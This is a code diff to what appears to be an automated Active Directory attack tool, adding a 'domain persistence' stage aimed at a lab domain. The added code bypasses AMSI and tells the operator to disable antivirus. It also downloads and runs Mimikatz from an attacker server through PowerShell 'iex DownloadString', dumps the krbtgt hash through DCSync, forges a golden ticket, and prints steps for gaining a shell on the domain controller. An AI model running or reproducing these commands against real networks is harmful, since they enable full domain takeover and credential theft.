@@ -1,8 +1,8 @@
 from lib.config import *
-import time,os,sys
+import time,os,sys,subprocess
 
 
-#Starting with the hacking 
+
 def stepFOUR_PrivilegeEsc():
     print(f"\n{ok} 3-Starting with check vulnerabilities to elevate privileges ...\n")
     print(f"{warning} A- Check Unquoted path services vulnerabilities...")
@@ -194,7 +194,12 @@ def stepFOUR_PrivilegeEsc():
     except Exception as e:
         print(f"{error} General Error: {e}")
 
-    print(f"\n{warning} G- Get Golden Ticket using krbtgt...")
+
+def stepFIVE_DomainPersistence():
+    print(f"\n{ok} 4-Starting with Domain Persistence...\n")
+    print(f"{ok} For this techniques may be necessary disable AV..")
+    x=input(f"{ok} When you finished press ENTER..\n")
+    print(f"\n{warning} A- Get Golden Ticket using krbtgt...")
     time.sleep(1)
     print(f"{ok} Bypassing AMSI Security...\n")
     bypass=configurazione()
@@ -220,10 +225,15 @@ def stepFOUR_PrivilegeEsc():
                         trovato=1
                         print(f"{ok} This account can get golden ticket")
                         time.sleep(1)
-                        mimikatz_final=bypass + "; " + f"iex (New-Object Net.WebClient).DownloadString('http://{IpServer}/Invoke-Mimikatz.ps1')" + "; Invoke-Mimidogz -Command '\"lsadump::dcsync /domain:marvel.local /user:krbtgt\"'"
-                        value=powershell_commandLine(mimikatz_final)
+                        #value=powershell_commandLine("Get-Content C:\\Users\\tony_stark\\Desktop\\Lelanto\\data\\prova3.txt")
+                        #stringa=cleanstring(value)
+                        mimikatz_final1=bypass + "; " + f"iex (New-Object Net.WebClient).DownloadString('http://{IpServer}/mimi.ps1')" + "; Invoke-Mimidogz -Command '\"lsadump::dcsync /domain:marvel.local /user:krbtgt\"'"
+                        value=powershell_commandLine(mimikatz_final1)
                         value=cleanstring(value)
                         print(value)
+                        #mimikatz_final=bypass + "; " + f"IEX(New-Object Net.WebClient).DownloadString('http://{IpServer}/pluto.ps1')" + "; Invoke-Mimidogz -Command '\"lsadump::dcsync /domain:marvel.local /user:krbtgt\"'"
+                        #value=powershell_commandLine(mimikatz_final)
+                        #value=cleanstring(value)
                         command22=command0 + " Get-DomainSID"
                         value=powershell_commandLine(command22)
                         domainSID=cleanstring(value)
@@ -232,19 +242,23 @@ def stepFOUR_PrivilegeEsc():
                         value=cleanstring(value)
                         value_list=value.split("\n")
                         domain=value_list[-1].split(":")[1].rstrip().strip()
-                        ntlm=input(f"{warning} Insert NTLM HASH of krbtgt': ")
+                        
+                        ntlm=input(f"{warning} Insert NTLM HASH of krbtgt: ")
                         commandMimikatz= bypass + "; " + f"iex (New-Object Net.WebClient).DownloadString('http://{IpServer}/Invoke-Mimikatz.ps1')" + f"; Invoke-Mimidogz -Command '\"  kerberos::golden /domain:{domain} /sid:{domainSID} /rc4:{ntlm} /id:500 /user:{account} /ptt\"'"
+                        #commandMimikatz=bypass + "; " + stringa +  + f"; Invoke-Mimidogz -Command '\"  kerberos::golden /domain:{domain} /sid:{domainSID} /rc4:{ntlm} /id:500 /user:{account} /ptt\"'"
                         value=powershell_commandLine(commandMimikatz)
                         value=powershell_commandLine("klist")
                         value=cleanstring(value)
                         print(value)
-
+                        print(f"\n{ok} 1- > net use S: \\<DC Name>.<Domain>.local\C$\n\t2- > S:\n\t3- You have a shell inside the DC..")
+                        
             
             if(trovato==0):
                 print(f"{error} This account cannot get golden ticket")
             
     except Exception as e:
         print(f"{error} General Error: {e}")
+        print(f"{warning} Sometimes this exception it caused by LELANTO. Copy this command on terminal e press enter:\n\n{bypass};iex (New-Object Net.WebClient).DownloadString('http://{IpServer}/Invoke-Mimikatz.ps1');Invoke-Mimidogz -Command '\"lsadump::dcsync /domain:marvel.local /user:krbtgt\"' ")
     
     sys.exit(0)
     print(f"{warning} Check if this domain user has access to a server where a domain admin is logged in...")
@@ -273,3 +287,6 @@ if __name__=="__main__":
     time.sleep(1)
     print("\n============================================================================\n")
     stepFOUR_PrivilegeEsc()
+    time.sleep(1)
+    print("\n============================================================================\n")
+    stepFIVE_DomainPersistence()
